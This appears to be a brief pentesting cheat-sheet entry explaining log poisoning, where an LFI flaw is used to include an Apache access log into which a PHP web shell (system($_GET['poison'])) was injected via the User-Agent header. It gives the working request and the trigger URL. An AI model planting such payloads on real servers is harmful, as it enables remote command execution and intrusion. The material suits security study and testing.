# Log Poisoning

## What does it mean?

* It is a common technique used to gain a reverse shell from a LFI vulnerability 
* To make it work an attacker attempts to inject malicious input to the server log

## What are the signs of this bug?

* Obviously you need to find an apache log file
* The directory of the file should have read and execute permissions

## How can I exploit this?

* Insert the following malicious code in the user agent field
* The PHP command will allow us to execute system commands by parsing the input to a GET parameter called `poison`

```bash
GET /v2/test.php?page=/var/log/apache2/access.log&poison=whoami HTTP/1.1
Host: 196.168
User-Agent: Mozilla <?php system($_GET['poison']); ?> Firefox
Accept: text/html
Connection: close
```

Forward the request and add your parameter to the link.

```text
http://target.com/v1/example.php?page=/var/log/apache2/access.log&poison=whoami
```

